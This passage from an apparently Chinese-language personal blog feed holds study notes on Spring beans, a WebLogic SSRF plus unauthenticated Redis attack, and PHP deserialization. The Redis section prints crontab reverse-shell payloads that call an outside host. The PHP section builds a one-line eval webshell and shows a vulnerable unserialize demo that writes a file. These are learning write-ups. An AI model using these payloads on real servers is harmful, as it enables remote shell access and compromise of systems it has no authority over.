<h4 id="3-2-bean标签范围配置"><a href="#3-2-bean标签范围配置" class="headerlink" title="3.2 bean标签范围配置"></a>3.2 bean标签范围配置</h4><p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029142430080.png" alt="image-20201029142430080"></p>
<p>容器中默认singleton，spring容器中只有单个bean对象。</p>
<p>prototype 每getbean一次新生成一个对象</p>
<h4 id="测试是借助junit测试"><a href="#测试是借助junit测试" class="headerlink" title="测试是借助junit测试"></a>测试是借助junit测试</h4><p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029143220835.png" alt="image-20201029143220835"></p>
<p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029143734924.png" alt="image-20201029143734924"></p>
<p>需要@Test标签和导入包。打印出来单例的地址是一样的，说明容器中只有一个对象。</p>
<p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029144253155.png" alt="image-20201029144253155"></p>
<p>singleton加载配置文件容器就创建了bean对象。prototype是每次getbean时创建一个对象</p>
<p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029144605189.png" alt="image-20201029144605189"></p>
<h4 id="3-3-bean标签范围配置init和destroy方法"><a href="#3-3-bean标签范围配置init和destroy方法" class="headerlink" title="3.3 bean标签范围配置init和destroy方法"></a>3.3 bean标签范围配置init和destroy方法</h4><p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029145240102.png" alt="image-20201029145240102"></p>
<p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029145544375.png" alt="image-20201029145544375"></p>
<p>对象先创建再调用init方法，destroy方法在容器销毁的时候还没来得及执行。</p>
<p>思路：1、尝试在destory方法下断点未果。说明没来的及执行销毁方法</p>
<p>2、容器手动关闭-&gt;容器意识到自己要被销毁，销毁之前把容器内对象的销毁方法执行一下-&gt;ApplicationContext是个接口，所以不用接口去接收子类，直接自己接收。</p>
<p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029150554743.png" alt="image-20201029150554743"></p>
<p>成功执行销毁函数。</p>
<h4 id="3-4-Bean实例化三种方式"><a href="#3-4-Bean实例化三种方式" class="headerlink" title="3.4 Bean实例化三种方式"></a>3.4 Bean实例化三种方式</h4><p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029150842885.png" alt="image-20201029150842885"></p>
<p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029152155628.png" alt="image-20201029152155628"></p>
<p>动态工厂通过容器内的动态工厂实例化对象调用bean实例化的方法。【这时候就可以jdbc的connection（driver manager）用有参构造的静态方法来实现】</p>
<p><code>以上都是spring产生dao层的对象</code></p>
<h3 id="12-18-Spring配置文件-依赖注入"><a href="#12-18-Spring配置文件-依赖注入" class="headerlink" title="12-18 Spring配置文件-依赖注入"></a>12-18 Spring配置文件-依赖注入</h3><p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029154351863.png" alt="image-20201029154351863"></p>
<p>想让业务层UserService也配置到容器当中</p>
<p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029215212653.png" alt="image-20201029215212653"></p>
<h4 id="3-7Bean的依赖注入概念"><a href="#3-7Bean的依赖注入概念" class="headerlink" title="3.7Bean的依赖注入概念"></a>3.7Bean的依赖注入概念</h4><p>依赖注入是Spring框架核心IOC的具体实现。【Service需要Dao的依赖注入】</p>
<p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029215506737.png" alt="image-20201029215506737"></p>
<p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029215548574.png" alt="image-20201029215548574"></p>
<p>set方法注入：<br><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029221407626.png" alt="image-20201029221407626"></p>
<p>这里是set方法后面的名字去掉大写</p>
<p><img src="/2020/10/29/spring%E5%BC%80%E5%8F%91/spring%E5%BC%80%E5%8F%91/E:%5Cblog%5Csource_posts%5Cspring%E5%BC%80%E5%8F%91%5Cimage-20201029221438916.png" alt="image-20201029221438916"></p>
<p>通过set方法将userDao对象注入到里面</p>
]]></content>
  </entry>
  <entry>
    <title>weblogic ssrf+redis/weblogic ssrf+redis</title>
    <url>/2020/11/05/weblogic%20ssrf+redis/weblogic%20ssrf+redis/</url>
    <content><![CDATA[<h2 id="一、WebLogic-SSRF漏洞简介"><a href="#一、WebLogic-SSRF漏洞简介" class="headerlink" title="一、WebLogic SSRF漏洞简介"></a>一、WebLogic SSRF漏洞简介</h2><p>漏洞编号：CVE-2014-4210<br>漏洞影响：版本10.0.2,10.3.6<br>漏洞产生的原因：<br>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
<h3 id="1-SSRF漏洞"><a href="#1-SSRF漏洞" class="headerlink" title="1. SSRF漏洞"></a>1. SSRF漏洞</h3><h4 id="1-1-漏洞简介"><a href="#1-1-漏洞简介" class="headerlink" title="1.1 漏洞简介"></a>1.1 漏洞简介</h4><p> SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
<h4 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h4><p> 通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成对内网系统的攻击。</p>
<h3 id="2、Weblogic-ssrf漏洞"><a href="#2、Weblogic-ssrf漏洞" class="headerlink" title="2、Weblogic ssrf漏洞"></a>2、Weblogic ssrf漏洞</h3><p>发现一个UDDI Explorer<br>这个漏洞影响的版本是weblogic 10.0.2 – 10.3.6</p>


<p><img src="/2020/11/05/weblogic%20ssrf+redis/weblogic%20ssrf+redis/.%5Cimage-20201105154925154.png" alt="image-20201105154925154"></p>
<p><img src="/2020/11/05/weblogic%20ssrf+redis/weblogic%20ssrf+redis/.%5Cimage-20201105151941638.png" alt="image-20201105151941638"></p>
<p><img src="/2020/11/05/weblogic%20ssrf+redis/weblogic%20ssrf+redis/.%5Cimage-20201105151220529.png" alt="image-20201105151220529"></p>
<p><img src="/2020/11/05/weblogic%20ssrf+redis/weblogic%20ssrf+redis/.%5Cimage-20201105151746431.png" alt="image-20201105151746431"></p>
<p>甚至可以探测主机是否存活。</p>
<h2 id="Redis-未授权"><a href="#Redis-未授权" class="headerlink" title="Redis 未授权"></a>Redis 未授权</h2><p>Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。   </p>
<p>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。   </p>
<p>如果Redis以<strong>root</strong>身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> 1 <span class="string">"\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/vps地址/1337 0&gt;&amp;1\n\n\n\n"</span></span><br><span class="line">config <span class="built_in">set</span> dir /etc/</span><br><span class="line">config <span class="built_in">set</span> dbfilename crontab</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>

<p>用url进行编码</p>
<p>这个方法始终没有写进去，尝试使用redis-cli写入：</p>
<p><img src="/2020/11/05/weblogic%20ssrf+redis/weblogic%20ssrf+redis/.%5Cimage-20201105162112170.png" alt="image-20201105162112170"></p>
<p>成功写入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.3&#x2F;9999 0&gt;&amp;1&quot; </span><br><span class="line">&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F; </span><br><span class="line">&gt; config set dbfilename root </span><br><span class="line">&gt; save</span><br></pre></td></tr></table></figure>



<p><img src="/2020/11/05/weblogic%20ssrf+redis/weblogic%20ssrf+redis/.%5Cimage-20201105162330796.png" alt="image-20201105162330796"></p>
<blockquote>
<p>set x “\n* * * * * bash -i &gt;&amp; /dev/tcp/10.0.0.3/9999 0&gt;&amp;1”<br>config set dir /var/spool/cron/<br>config set dbfilename root<br>save</p>
</blockquote>
<p>linux 设备里面有个比较特殊的文件:</p>
<p>/dev/[tcp|upd]/host/port 只要读取或者写入这个文件，相当于系统会尝试连接:host 这台机器，对应port端口。如果主机以及端口存在，就建立一个<strong>socket 连接</strong>。将在，/proc/self/fd目录下面，有对应的文件出现。</p>
<p>这个文件并不存在，而且并不是一个设备文件。这只是 bash 实现的用来实现网络请求的一个接口，其实就像我们自己编写的一个命令行程序，按照指定的格式输入 host port参数，就能发起一个 socket连接完全一样。</p>
]]></content>
  </entry>
  <entry>
    <title>wordpress漏洞/wordpress漏洞</title>
    <url>/2020/10/17/wordpress%E6%BC%8F%E6%B4%9E/wordpress%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><p><img src="/2020/10/17/wordpress%E6%BC%8F%E6%B4%9E/wordpress%E6%BC%8F%E6%B4%9E/E:%5Cblog%5Csource_posts%5Cwordpress%E6%BC%8F%E6%B4%9E%5Cimage-20201017175754883.png" alt="image-20201017175754883"></p>
]]></content>
  </entry>
  <entry>
    <title>php序列化杂记</title>
    <url>/2020/05/10/php%E5%BA%8F%E5%88%97%E5%8C%96%E6%9D%82%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="php序列化杂记"><a href="#php序列化杂记" class="headerlink" title="php序列化杂记"></a>php序列化杂记</h1><p>今天比了赛 也认识到自己的能力有限 但是这一个月的web题目做下来也不能急于求成什么，继续努力</p>
<p>这是今天的php序列化代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($op=<span class="string">""</span>,$filename=<span class="string">""</span>,$content=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">$this</span>-&gt;op = $op;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;content = $content;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class4 = <span class="keyword">new</span> FileHandler(<span class="string">"2"</span>,<span class="string">"haha.php"</span>,<span class="string">"&lt;?php eval(@\$_POST['a']); ?&gt;"</span>);</span><br><span class="line">$class4_ser = serialize($class4);	</span><br><span class="line">print_r($class4_ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里是输出结果：</p>
<p><code>O:11:&quot;FileHandler&quot;:3:{s:5:&quot;*op&quot;;s:1:&quot;2&quot;;s:11:&quot;*filename&quot;;s:8:&quot;haha.php&quot;;s:10:&quot;*content&quot;;s:28:&quot;&quot;;}</code></p>
<p>这里有几个点我要注意一下：</p>
<ol>
<li><p>这些变量名前的修饰时protected，在序列化的时候会不一样</p>
</li>
<li><p>这里序列化的大括号里s都少了2个字节原因是实际的”s“是%00*op%00，%00代表终止符，null</p>
</li>
<li><p>一句话木马那一行转义了dollar符号＄，注意是反斜杠转义。</p>
</li>
<li><p><strong>print_r()</strong> 函数用于打印变量，以更容易理解的形式展示。</p>
</li>
<li><p><strong>print_r()</strong>、 <a href="https://www.php.net/manual/zh/function.var-dump.php" target="_blank" rel="noopener">var_dump()</a>、 <a href="https://www.php.net/manual/zh/function.var-export.php" target="_blank" rel="noopener">var_export()</a> 都会显示对象 protected 和 private 的属性。 Class 的静态属性（static） 则不会显示。  </p>
</li>
</ol>
<p>接下来进入正文介绍：</p>
<h3 id="0x01-PHP的序列化和反序列化"><a href="#0x01-PHP的序列化和反序列化" class="headerlink" title="0x01 PHP的序列化和反序列化"></a>0x01 PHP的序列化和反序列化</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>这其实是为了解决 <strong>PHP 对象传递</strong>的一个问题,因为 PHP 文件在执行结束以后就会将对象销毁，那么如果下次有一个页面恰好要用到刚刚销毁的对象就会束手无策，总不能你永远不让它销毁，等着你吧，于是人们就想出了一种能<strong>长久保存对象</strong>的方法，这就是 PHP 的序列化，那当我们下次要用的时候只要反序列化一下就 ok 啦</p>
<p>序列化的目的是方便数据的传输和<strong>存储</strong>. json 是为了传递数据的方便性.</p>
<p>序列化示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">'P2hm1n'</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">'secret'</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $age = <span class="string">'20'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test1 = <span class="keyword">new</span> test();</span><br><span class="line"></span><br><span class="line">$object = serialize($test1);</span><br><span class="line"></span><br><span class="line">print_r($object);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>关键函数 serialize():将PHP中创建的对象，变成一个<strong>字符串</strong></p>
<p>private属性序列化的时候格式是 %00类名%00成员名</p>
<p>protected属性序列化的时候格式是 %00*%00成员名</p>
<p>关键要点：</p>
<p>在Private 权限私有属性序列化的时候格式是 %00类名%00属性名</p>
<p>在Protected 权限序列化的时候格式是 %00*%00属性名</p>
<p>你可能会发现这样一个问题，你这个类定义了那么多方法，怎么把对象序列化了以后全都丢了？你看你整个序列化的字符串里面<strong>全是属性</strong>，就没有一个方法，这是为啥？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">请记住，序列化他只序列化属性，不序列化方法，这个性质就引出了两个非常重要的话题：</span><br></pre></td></tr></table></figure>

<p>(1)我们在反序列化的时候一定要保证在当前的<strong>作用域环境</strong>下有该类存在</p>
<p>这里不得不扯出反序列化的问题，这里先简单说一下，反序列化就是将我们压缩格式化的对象还原成初始状态的过程（可以认为是解压缩的过程），因为我们没有序列化方法，因此在反序列化以后我们如果想正常使用这个对象的话我们必须要<strong>依托于这个类要在当前作用域存在</strong>的条件。</p>
<p>(2)我们在反序列化攻击的时候也就是<strong>依托类属性</strong>进行攻击</p>
<p>因为没有序列化方法嘛，我们能控制的只有<strong>类的属性</strong>，因此类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击（这是我们攻击的核心思想，这里先借此机会抛出来，大家有一个印象）</p>
<p>关键函数 unserialize():将经过序列化的字符串转换回PHP值</p>
<p>当有 protected 和 private 属性的时候记得补齐空的字符串</p>
<p><strong>__wakeup()魔术方法</strong></p>
<p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p>
<p>序列化public private protect参数产生不同结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $test1=<span class="string">"hello"</span>;</span><br><span class="line">    <span class="keyword">public</span> $test2=<span class="string">"hello"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $test3=<span class="string">"hello"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize($test);  <span class="comment">//  O:4:"test":3:&#123;s:11:" test test1";s:5:"hello";s:5:"test2";s:5:"hello";s:8:" * test3";s:5:"hello";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里介绍一下public、private、protected的区别</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public(公共的):在本类内部、外部类、子类都可以访问</span><br><span class="line"></span><br><span class="line">protect(受保护的):只有本类或子类或父类中可以访问</span><br><span class="line"></span><br><span class="line">private(私人的):只有本类内部可以使用</span><br></pre></td></tr></table></figure>

<p>PHP反序列化标识符含义：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a - array</span><br><span class="line">b - boolean</span><br><span class="line">d - double</span><br><span class="line">i - integer</span><br><span class="line">o - common object</span><br><span class="line">r - reference</span><br><span class="line">s - string</span><br><span class="line">C - custom object</span><br><span class="line">O - class</span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - unicode string</span><br></pre></td></tr></table></figure>



<p>test类定义了三个不同类型(私有，公有，保护)但是值相同的字符串，序列化输出的值不相同 O:4:”test”:3:{s:11:” test test1”;s:5:”hello”;s:5:”test2”;s:5:”hello”;s:8:” * test3”;s:5:”hello”;}</p>
<p>这里的O指Object，代表储存的是对象，如果serialize()传入的是一个数组，那么就是字母a。4代表对象的名称有4个字符。”test”表示对象的名称。3表示对象有三个属性。s代表字符串，11代表长度，后面的代表字符串名称（属性），之后的hello是值。</p>
<p>通过对网页抓取输出是这样的 O:4:”test”:3:{s:11:”\00test\00test1”;s:5:”hello”;s:5:”test2”;s:5:”hello”;s:8:”\00*\00test3”;s:5:”hello”;}</p>
<p>private的参数被反序列化后变成 \00test\00test1 public的参数变成 test2 protected的参数变成 \00*\00test3</p>
<p><code>疑惑的是：%00和\00（&lt;-网页抓取的结果）的区别是什么？</code></p>
<h3 id="0x02-为什么会产生反序列化漏洞？"><a href="#0x02-为什么会产生反序列化漏洞？" class="headerlink" title="0x02 为什么会产生反序列化漏洞？"></a>0x02 为什么会产生反序列化漏洞？</h3><p> 序列化本身没有问题，问题还是那个经典的老大难：<strong>用户输入（  PHP 对象注入漏洞 ）</strong>， 反序列化漏洞的成因在于<strong>代码中的 unserialize() 接收的参数可控</strong> 。我们可以控制序列化和反序列化的参数，就可以篡改对象的属性来达到攻击目的。为了达到我们想实现的目的，就必须对序列化和反序列化过程进行详尽的了解，利用或者绕过某些魔法函数。 </p>
<h4 id="PHP的魔法方法"><a href="#PHP的魔法方法" class="headerlink" title="PHP的魔法方法"></a>PHP的魔法方法</h4><p>PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法（通常都设置了某些特定条件来触发）。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 常见的魔法方法如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct()，类的构造函数 &lt;-</span><br><span class="line"></span><br><span class="line">__destruct()，类的析构函数，对销毁的时候调用 &lt;-</span><br><span class="line"></span><br><span class="line">__call()，在对象中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__callStatic()，用静态方式中调用一个不可访问方法时调用</span><br><span class="line"></span><br><span class="line">__get()，获得一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__set()，设置一个类的成员变量时调用</span><br><span class="line"></span><br><span class="line">__isset()，当对不可访问属性调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()时调用</span><br><span class="line"></span><br><span class="line">__unset()，当对不可访问属性调用<span class="keyword">unset</span>()时被调用。</span><br><span class="line"></span><br><span class="line">__sleep()，执行serialize()时，先会调用这个函数。用于清理对象，并返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则<span class="keyword">NULL</span>被序列化，导致一个E_NOTICE错误 &lt;-</span><br><span class="line"></span><br><span class="line">__wakeup()，执行unserialize()时，先会调用这个函数 &lt;-</span><br><span class="line"></span><br><span class="line">__toString()，类被当成字符串时的回应方法 &lt;-</span><br><span class="line"></span><br><span class="line">__invoke()，调用函数的方式调用一个对象时的回应方法</span><br><span class="line"></span><br><span class="line">__set_state()，调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line"></span><br><span class="line">__clone()，当对象复制完成时调用</span><br><span class="line"></span><br><span class="line">__autoload()，尝试加载未定义的类</span><br><span class="line"></span><br><span class="line">__debugInfo()，打印所需调试信息</span><br></pre></td></tr></table></figure>

<p>(1) __construct()：当对象创建时会自动调用(但在unserialize()时是不会自动调用的)。<br>(2) __wakeup() ：unserialize()时会自动调用<br>(3) __destruct()：当对象被销毁时会自动调用。<br>(4) __toString():当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用<br>(5) __get() :当从不可访问的属性读取数据<br>(6) __call(): 在对象上下文中调用不可访问的方法时触发<br>(7) sleep()，执行serialize()时，先会调用这个函数。用于清理对象，并返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致一个E_NOTICE错误 </p>
<ul>
<li>测试代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">virusday</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $test = <span class="string">'123'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__wakeup"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__sleep"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'test'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">"__toString"</span>.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__conStruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__construct"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__destruct"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$virusday_1 = <span class="keyword">new</span> virusday();</span><br><span class="line">$data = serialize($virusday_1);</span><br><span class="line">$virusday_2 = unserialize($data);</span><br><span class="line"><span class="keyword">print</span>($virusday_2);</span><br><span class="line"><span class="keyword">print</span>($data.<span class="string">"&lt;/br&gt;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__construct</span><br><span class="line">__sleep    &lt;- serialize</span><br><span class="line">__wakeup</span><br><span class="line">__toString   &lt;- print($virusday_2);</span><br><span class="line">O:8:&quot;virusday&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;  </span><br><span class="line">__destruct</span><br><span class="line">__destruct</span><br></pre></td></tr></table></figure>



<p>可以看到__destruct函数执行了两次，说明有两个对象被销毁，一个是实例化的对象，还有一个是反序列化后生成的对象。</p>
<h4 id="利用构造函数"><a href="#利用构造函数" class="headerlink" title="利用构造函数"></a>利用构造函数</h4><h5 id="Magic-function"><a href="#Magic-function" class="headerlink" title="Magic function"></a>Magic function</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">virusday</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__wakeup"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__construct"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__destruct"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class2 = <span class="string">'O:8:"virusday":1:&#123;s:4:"test";s:3:"123";&#125;'</span>;</span><br><span class="line">	print_r($class2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$class2_unser = unserialize($class2);</span><br><span class="line">print_r($class2_unser);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h4><h5 id="wakeup-或-destruct"><a href="#wakeup-或-destruct" class="headerlink" title="__wakeup() 或__destruct()"></a><code>__wakeup() 或__destruct()</code></h5><p>由前可以看到，<strong>unserialize()</strong>后会导致<strong><code>__wakeup()</code></strong>或<strong><code>__destruct()</code></strong>的直接调用(唤醒或者销毁)，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在<strong>wakeup() 或</strong><strong>destruct()</strong>中，从而当我们控制序列化字符串时可以去直接触发它们。这里针对 __wakeup() 场景做个实验。假设index源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">virusday</span></span>&#123;	</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">'123'</span>;	</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;		</span><br><span class="line">        $fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>) ;		</span><br><span class="line">        fwrite($fp,<span class="keyword">$this</span>-&gt;test);		</span><br><span class="line">        fclose($fp);	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class3 = $_GET[<span class="string">'test'</span>];</span><br><span class="line">print_r($class3);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$class3_unser = unserialize($class3);</span><br><span class="line"><span class="keyword">require</span> <span class="string">"shell.php"</span>;<span class="comment">// 为显示效果，把这个shell.php包含进来<span 